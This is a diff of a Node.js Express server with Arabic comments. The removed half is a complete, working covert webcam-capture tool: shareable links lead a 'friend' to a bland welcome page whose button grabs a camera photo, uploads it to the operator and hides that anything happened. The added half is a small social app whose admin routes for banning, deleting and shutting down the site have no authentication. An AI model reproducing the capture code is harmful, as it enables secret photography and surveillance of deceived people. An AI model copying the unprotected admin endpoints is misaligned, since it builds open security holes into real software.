@@ -1,131 +1,102 @@
-     const express = require('express');
+const express = require('express');
 const app = express();
-app.use(express.json({ limit: '5mb' }));
+app.use(express.json({ limit:'10mb' }));
+app.use(express.static('frontend'));
 
 const PORT = process.env.PORT || 3000;
 
-// تخزين الصور مؤقتًا
-const images = {};
+// قاعدة البيانات المؤقتة
+let users = {}; // {userId: {name, verified, posts: []}}
+let posts = {}; // {postId: {userId, content, comments: [], rating: 0}}
+let chat = []; // الدردشة الجماعية
+let bannedUsers = []; // حظر المستخدمين
+let siteStatus = { online: true }; // تشغيل/اغلاق الموقع
 
-// الصفحة الرئيسية — توليد روابط + عرض الصور لك فقط
-app.get('/', (req, res) => {
-  const allImages = Object.entries(images).map(
-    ([id, img]) =>
-      `<h3>Image from link ${id}</h3><img src="${img}" style="max-width:300px">`
-  ).join('');
-
-  res.send(`
-    <html>
-      <head>
-        <title>Main Page</title>
-        <style>
-          body { font-family: Arial; text-align:center; margin:50px; }
-          button { padding:10px 20px; font-size:16px; cursor:pointer; }
-          a { display:block; margin:10px; color:blue; }
-        </style>
-      </head>
-      <body>
-        <h1>Generate Camera Link</h1>
-        <button onclick="gen()">Generate Link</button>
-        <div id="links"></div>
-
-        <h2>Captured Images (You Only)</h2>
-        ${allImages}
-
-        <script>
-          function gen(){
-            const id = Math.floor(Math.random()*100000);
-            const link = location.origin + '/c/' + id;
-            const a = document.createElement('a');
-            a.href = link;
-            a.textContent = link;
-            document.getElementById('links').appendChild(a);
-          }
-        </script>
-      </body>
-    </html>
-  `);
+// Middleware لفحص الموقع مغلق
+app.use((req,res,next)=>{
+  if(!siteStatus.online && !req.url.startsWith('/admin')) 
+    return res.send('<h1>الموقع تحت الصيانة</h1>');
+  next();
 });
 
-
-// صفحة الرابط — ما يراه صديقك
-app.get('/c/:id', (req, res) => {
-  const id = req.params.id;
-
-  res.send(`
-    <html>
-      <head>
-        <meta name="viewport" content="width=device-width,initial-scale=1">
-        <title>Welcome</title>
-        <style>
-          body {
-            font-family: Arial;
-            text-align:center;
-            margin-top:120px;
-          }
-          button {
-            padding:14px 28px;
-            font-size:18px;
-            cursor:pointer;
-          }
-        </style>
-      </head>
-      <body>
-
-        <h1>أهلاً بك</h1>
-        <button id="go">اضغط للمتابعة</button>
-
-        <script>
-          document.getElementById('go').onclick = async () => {
-
-            // طلب إذن الكاميرا
-            try {
-              const stream = await navigator.mediaDevices.getUserMedia({video:true});
-
-              const video = document.createElement('video');
-              video.srcObject = stream;
-              video.play();
-
-              // التقاط صورة واحدة تلقائيًا
-              video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video,0,0);
-
-                const img = canvas.toDataURL('image/png');
-
-                // إرسال الصورة للسيرفر
-                fetch('/upload/${id}',{
-                  method:'POST',
-                  headers:{'Content-Type':'application/json'},
-                  body: JSON.stringify({image: img})
-                });
-
-                // إيقاف الكاميرا
-                stream.getTracks().forEach(t=>t.stop());
-
-                // إبقاء الصفحة كما هي
-                document.body.innerHTML = "<h1>أهلاً بك</h1>";
-              };
-
-            } catch(e) {
-              alert("Camera permission denied");
-            }
-
-          };
-        </script>
-
-      </body>
-    </html>
-  `);
+// --- واجهة المستخدم ---
+app.get('/user', (req,res)=>{
+  res.sendFile(__dirname+'/frontend/user.html');
 });
 
-
-// استقبال الصورة
-app.post('/upload/:id', (req, res) => {
-  images[req.params.id] = req.body.image;
-  res.json({ ok: true });
+// إضافة منشور
+app.post('/post', (req,res)=>{
+  const { userId, content } = req.body;
+  if(bannedUsers.includes(userId)) return res.json({error:'محظور'});
+  const postId = Date.now();
+  posts[postId] = { userId, content, comments:[], rating:0 };
+  if(!users[userId]) users[userId] = {name:'مستخدم'+userId, verified:false, posts:[]};
+  users[userId].posts.push(postId);
+  res.json({ success:true, postId });
 });
 
-app.listen(PORT, () => console.log("Server running"));
+// إضافة تعليق
+app.post('/comment', (req,res)=>{
+  const { postId, userId, comment } = req.body;
+  if(!posts[postId]) return res.json({error:'المنشور غير موجود'});
+  posts[postId].comments.push({ userId, comment });
+  res.json({success:true});
+});
+
+// التقييم
+app.post('/rate', (req,res)=>{
+  const { postId, rating } = req.body;
+  if(!posts[postId]) return res.json({error:'المنشور غير موجود'});
+  posts[postId].rating += rating;
+  res.json({success:true});
+});
+
+// الدردشة الجماعية
+app.get('/chat', (req,res)=>res.json(chat));
+app.post('/chat', (req,res)=>{
+  const { userId, message } = req.body;
+  chat.push({ userId, message, time: new Date() });
+  res.json({success:true});
+});
+
+// --- لوحة التحكم ---
+app.get('/admin', (req,res)=>{
+  res.sendFile(__dirname+'/frontend/admin.html');
+});
+
+// تحكم الأدمن: حظر مستخدم
+app.post('/admin/ban', (req,res)=>{
+  const { userId } = req.body;
+  if(!bannedUsers.includes(userId)) bannedUsers.push(userId);
+  res.json({success:true});
+});
+
+// حذف منشور
+app.post('/admin/deletePost', (req,res)=>{
+  const { postId } = req.body;
+  delete posts[postId];
+  res.json({success:true});
+});
+
+// حذف تعليق
+app.post('/admin/deleteComment', (req,res)=>{
+  const { postId, commentIndex } = req.body;
+  if(posts[postId]) posts[postId].comments.splice(commentIndex,1);
+  res.json({success:true});
+});
+
+// وضع علامة تحقق للمستخدم
+app.post('/admin/verifyUser', (req,res)=>{
+  const { userId } = req.body;
+  if(users[userId]) users[userId].verified = true;
+  res.json({success:true});
+});
+
+// تشغيل/إغلاق الموقع
+app.post('/admin/siteStatus', (req,res)=>{
+  const { online } = req.body;
+  siteStatus.online = online;
+  res.json({success:true});
+});
+
+app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));
